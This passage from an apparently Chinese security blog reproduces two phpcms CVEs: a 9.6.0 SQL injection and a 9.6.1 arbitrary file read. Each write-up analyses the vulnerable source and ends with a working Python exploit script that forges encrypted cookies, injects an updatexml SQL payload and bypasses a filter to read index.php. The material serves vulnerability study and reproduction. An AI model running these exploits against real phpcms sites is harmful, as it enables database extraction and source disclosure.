      <a data-url="https://www.ccreater.top/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ckmn57579006ds1nigmeuhrag" data-title="phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpcmsv9.6.0SQLæ³¨å…¥" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQLæ³¨å…¥</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0SQLæ³¨å…¥"><a href="#phpcmsv9-6-0SQLæ³¨å…¥" class="headerlink" title="phpcmsv9.6.0SQLæ³¨å…¥"></a>phpcmsv9.6.0SQLæ³¨å…¥</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol>
<li>å¼€å¯wap</li>
<li>phpcms ç‰ˆæœ¬å°äºç­‰äº9.6.0</li>
</ol>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä¿¡æ¯:</p>
<blockquote>
<p>è¿™ä¸ªç‰ˆæœ¬çš„ <strong>SQLæ³¨å…¥</strong> ä¸»è¦åœ¨äºç¨‹åºå¯¹è§£å¯†åçš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤. æ¼æ´æ–‡ä»¶: <strong>phpcms/modules/content/down.php</strong> ã€‚åœ¨å…¶ <strong>init</strong> æ–¹æ³•ä¸­ï¼Œä» <strong>GET</strong> æ•°æ®ä¸­è·å–äº† <strong>a_k</strong> çš„å€¼ ,è§£å¯†åç›´æ¥å˜é‡è¦†ç›–,å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<pre><code class="php">public function init() {
        $a_k = trim($_GET[&#39;a_k&#39;]);
        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));
        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
        $allow_visitor = 1;
        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    
        ...
    }</code></pre>
<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>è·Ÿè¿›å»</p>
<pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
        if (is_array($where)) $where = $this-&gt;sqls($where);
        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
    }</code></pre>
<pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {
        if (is_array($where)) {
            $sql = &#39;&#39;;
            foreach ($where as $key=&gt;$val) {
                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;
            }
            return $sql;
        } else {
            return $where;
        }
    }</code></pre>
<pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;
        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;
        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;
        $limit = &#39; LIMIT 1&#39;;
        $field = explode( &#39;,&#39;, $data);
        array_walk($field, array($this, &#39;add_special_char&#39;));
        $data = implode(&#39;,&#39;, $field);

        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;
        $this-&gt;execute($sql);
        $res = $this-&gt;fetch_next();
        $this-&gt;free_result();
        return $res;
    }</code></pre>
<p>æ²¡æœ‰å¯¹è§£å¯†åçš„idè¿›è¡Œä»»ä½•è¿‡æ»¤</p>
<p>æ¥ç€è¦æ‰¾ä¸€ä¸ªèƒ½ç”¨ç›¸åŒå¯†é’¥åŠ å¯†çš„åœ°æ–¹,è¿™æ ·ä¾¿æ— éœ€æš´éœ²auth_keyå°±èƒ½æ‰§è¡Œæ¶æ„sqlè¯­å¥</p>
<p>æˆ‘ä»¬åˆ©ç”¨<code>set_cookie</code>æ¥ç”ŸæˆåŠ å¯†æ•°æ®</p>
<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
<p>æŸ¥æ‰¾è°ƒç”¨<code>set_cookie</code>ä¸”å€¼<code>$value</code>å¯æ§çš„ä½ç½®</p>
<p><code>phpcms/modules/attachment/attachments.php</code> æ–‡ä»¶çš„ <code>swfupload_json</code> æ–¹æ³•æœ‰æ»¡è¶³æˆ‘ä»¬éœ€è¦çš„ä»£ç ã€‚(èœé¸¡ç›´æ¥çœ‹åˆ«äººæ‰¾åˆ°çš„)</p>
<pre><code class="php">public function swfupload_json() {
        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
        $json_str = json_encode($arr);
        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
            return true;
        } else {
            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
            param::set_cookie(&#39;att_json&#39;,$json_str);
            return true;            
        }
    }</code></pre>
<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,è·Ÿè¿›<code>safe_replace</code></p>
<pre><code class="php">function safe_replace($string) {
    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);
    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);
    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);
    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);
    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
    return $string;
}</code></pre>
<p>è™½ç„¶è¿™é‡Œå•å¼•å·è¢«è¿‡æ»¤äº†,ä½†æ˜¯å‰é¢æ˜¯ç”¨<code>parse_str($a_k);</code>æ¥æ¢å¤å˜é‡çš„,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>safe_replace</code>èƒ½å°†æŸäº›å­—ç¬¦æ›¿æ¢ä¸ºç©ºæ ¼ç”¨urlç¼–ç æ¥ç»•è¿‡é»‘åå•</p>
<p>ä½†æ˜¯åœ¨è°ƒç”¨<code>swfupload_json</code> å‰,å®ƒè¿˜ä¼šè°ƒç”¨<code>__construct</code>æ–¹æ³•</p>
<pre><code class="php">function __construct() {
        pc_base::load_app_func(&#39;global&#39;);
        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);        
        $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);
        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));
        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;
        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;
        //åˆ¤æ–­æ˜¯å¦ç™»å½•
        if(empty($this-&gt;userid)){
            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));
        }
    }</code></pre>
<p>æˆ‘ä»¬éœ€è¦ç”¨<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>æ¥ç”Ÿæˆ<code>$this-&gt;userid</code>,æ¥ç»•è¿‡æ­»äº¡exit</p>
<p>è¿™æ¬¡æˆ‘ä»¬è¿˜éœ€è¦æ‰¾ä¸€ä¸ªåœ°æ–¹æ¥ç”Ÿæˆ<code>userid</code>,ä½†æ˜¯é™åˆ¶æ›´å°‘äº†,åªè¦<code>$this-&gt;userid</code>ä¸ä¸ºç©ºå³å¯</p>
<p> æˆ‘ä»¬å¯ä»¥æœåˆ° <code>phpcms/modules/wap/index.php</code> æ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ <code>$_GET[&#39;siteid&#39;]</code> å¯æ§ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ <strong>cookie</strong> è·å¾—åŠ å¯†åçš„æ•°æ®,è™½ç„¶æœ‰intvalæ¥è¿‡æ»¤</p>
<pre><code class="php">function __construct() {        
        $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
        $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
    }</code></pre>
<p>äºæ˜¯æ•´ä¸ªæ”»å‡»é“¾ä¾¿å®Œæ•´äº†</p>
<p>å…ˆåˆ©ç”¨wapæ¥è·å¾—<code>userid</code></p>
<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
<p>å†åˆ©ç”¨attachmentæ¥è·å¾—åŠ å¯†çš„æ¶æ„sqlè¯­å¥</p>
<pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(çœ‹pocå§)
post:
userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import re
import requests
import random

def poc(url,proxies={}):
    sess=requests.session()
    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
    param={
        &quot;m&quot;:&quot;attachment&quot;,
        &quot;c&quot;:&quot;attachments&quot;,
        &quot;a&quot;:&quot;swfupload_json&quot;,
        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;
    }
    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
    #print(userid,a_k)
    if &quot;XPATH syntax error&quot; in result:
        return True
    return False


#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†</a></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQLæ³¨å…¥/">https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQLæ³¨å…¥/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="ckmn5757a006hs1ni9b0kc048" data-title="phpcmsv9.6.0SQLæ³¨å…¥" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–"><a href="#phpcmsv9-6-1ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–"></a>phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä½ç½®: <code>phpcms/modules/content/down.php</code> ã€‚åœ¨è¯¥æ–‡ä»¶çš„ <code>download</code> æ–¹æ³•ä¸­æœ€åä¸€è¡Œè°ƒç”¨äº† <code>file_down</code> æ–‡ä»¶ä¸‹è½½å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„ã€‚ </p>
<pre><code class="php">    public function download() {
        $a_k = trim($_GET[&#39;a_k&#39;]);
        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
        unset($i,$m,$f,$t,$ip);
        parse_str($a_k);        
        ...
        $starttime = intval($t);
        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
        $fileurl = trim($f);
        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));    
        $endtime = SYS_TIME - $starttime;
        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));
        if($m) $fileurl = trim($s).trim($fileurl);
        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
        //è¿œç¨‹æ–‡ä»¶
        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
            header(&quot;Location: $fileurl&quot;);
        } else {
            if($d == 0) {
                header(&quot;Location: &quot;.$fileurl);
            } else {
                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
                $filename = basename($fileurl);
                //å¤„ç†ä¸­æ–‡æ–‡ä»¶
                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
                    $filename = urldecode(basename($filename));
                }
                $ext = fileext($filename);
                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);
                file_down($fileurl, $filename);
            }
        }
    }</code></pre>
<p>æˆ‘ä»¬è·Ÿè¿›<code>file_down</code>:</p>
<pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {
    if(!$filename) $filename = basename($filepath);
    if(is_ie()) $filename = rawurlencode($filename);
    $filetype = fileext($filename);
    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
    if(ob_get_length() !== false) @ob_end_clean();
    header(&#39;Pragma: public&#39;);
    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);
    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);
    header(&#39;Content-Transfer-Encoding: binary&#39;);
    header(&#39;Content-Encoding: none&#39;);
    header(&#39;Content-type: &#39;.$filetype);
    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);
    header(&#39;Content-length: &#39;.$filesize);
    readfile($filepath);
    exit;
}</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä»–ä¼šç›´æ¥è¯»å–æ–‡ä»¶ç„¶å,exit</p>
<p>æˆ‘ä»¬å†çœ‹ä¸‹<code>download</code>ä¸­çš„<code>$fileurl</code>çš„ç”Ÿæˆè¿‡ç¨‹:</p>
<pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
if($m) $fileurl = trim($s).trim($fileurl);
if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre>
<p><code>$fileurl</code>ç”±<code>$f</code>äº§ç”Ÿçš„,å…¶ä¸­ä¸èƒ½å¸¦æœ‰phpç­‰å…³é”®å­—,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€åä¸€è¡Œçš„str_replaceæ¥ç»•è¿‡,è€Œ<code>$f</code>ç”±<code>parse_str($a_k)</code>å¾—æ¥çš„</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾ä¸€å¤„</p>
<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre>
<p>ä»¥<code>$pc_auth_key</code>ä½œä¸ºå¯†é’¥çš„åŠ å¯†ç‚¹</p>
<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
<p>æ˜¾ç„¶åªæœ‰ä¸­é—´çš„é‚£ä¸ªå¯ä»¥</p>
<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));
$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre>
<p>è€Œ<code>$i,$m,$f</code>ç­‰éƒ½æ˜¯ä»<code>parse_str($a_k);</code>è·å¾—</p>
<pre><code class="php">        parse_str($a_k);
        if(isset($i)) $i = $id = intval($i);
        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre>
<p>æ¥ä¸‹æ¥å°±è·Ÿ9.6.0ç‰ˆæœ¬çš„sqlæ³¨å…¥ç›¸åŒäº†</p>
<h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import re
import requests
import random
from urllib.parse import quote
def poc(url,proxies={}):
    sess=requests.session()
    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
    param={
        &quot;m&quot;:&quot;attachment&quot;,
        &quot;c&quot;:&quot;attachments&quot;,
        &quot;a&quot;:&quot;swfupload_json&quot;,
        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)
    }
    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
    #print(sess.cookies.get_dict())
    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
    #print(userid,a_k)
    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]
    #print(result)
    #print(a_k)
    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))
    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:
        return True
    else :
        return False



#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†/</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/">https://www.ccreater.top/1970/01/01/phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="ckmn5757b006ls1nieu49gsbj" data-title="phpcmsv9.6.1ä»»æ„æ–‡ä»¶è¯»å–" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/phpmyadmin%204.8.1%20rce/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
